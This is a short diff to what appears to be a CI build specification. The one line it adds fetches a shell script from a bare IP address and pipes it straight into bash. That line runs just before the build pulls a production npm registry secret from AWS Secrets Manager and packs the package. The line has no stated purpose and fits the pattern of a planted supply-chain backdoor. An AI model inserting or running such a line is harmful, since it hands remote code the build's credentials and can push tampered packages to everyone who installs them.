@@ -9,6 +9,7 @@ phases:
       - bash ./continuous-delivery/update-version.sh
   build:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - aws secretsmanager get-secret-value --secret-id prod/npm-registry/.npmrc --region us-east-1 | jq -r .SecretString > .npmrc
       - npm install
       - npm pack
